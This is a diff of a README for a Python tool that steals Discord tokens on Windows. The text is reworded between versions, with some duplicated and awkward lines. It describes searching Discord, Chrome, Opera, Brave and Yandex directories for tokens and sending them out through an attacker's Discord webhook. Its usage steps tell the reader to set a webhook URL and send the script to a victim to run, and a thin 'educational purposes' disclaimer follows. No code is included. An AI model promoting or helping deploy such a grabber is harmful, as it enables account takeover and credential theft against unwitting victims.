@@ -1,24 +1,38 @@
-**Discord Token Grabber Build Status Profile views**
+**A Python script for grabbing Discord tokens (this version of the grabber only supports Windows).**
 
-    A Discord token grabber written in Python (this version of the grabber only supports Windows).
 
 **Features**
 
-    No data caching.
-    Transfers via Discord webhook.
-    Searching for tokens in multiple directories (Discord, Discord PTB, Discord Canary, Chrome, Opera, Brave and Yandex).
-    No external Python modules needed.
-    No external Python modules required.
 
-**How to use**
+There is no data caching.
 
-    Create a webhook on your Discord server. I recommend creating a new server.
-    Change the 'WEBHOOK_URL' variable value in line 184 to your Discord webhook URL in token_grabber.py.
-    Send the script to your victim and make them run it.
+Transfers are made over a Discord webhook.
+
+Searching several directories for tokens (Discord, Discord PTB, Discord Canary, Chrome, Opera, Brave and Yandex).
+
+No other Python modules are required.
+
+There are no other Python modules required.
+
+
+**How to Make Use of**
+
+
+On your Discord server, create a webhook.
+I advise you to start a fresh server.
+
+In super token grabber.py, change the 'WEBHOOK URL' variable value to your Discord webhook URL on line 184.
+
+To make your victim run the script, send it to them.
+
 
 **Example**
 
-https://i.imgur.com/UnaleM1.jpg
-Caution
 
-This script is for educational purposes. I am in no way responsible for any inconvenience.
+https://i.imgur.com/UnaleM1.jpg
+
+**Caution**
+
+
+This script is intended to be used for educational purposes only.
+I take no responsibility for any difficulty caused. 
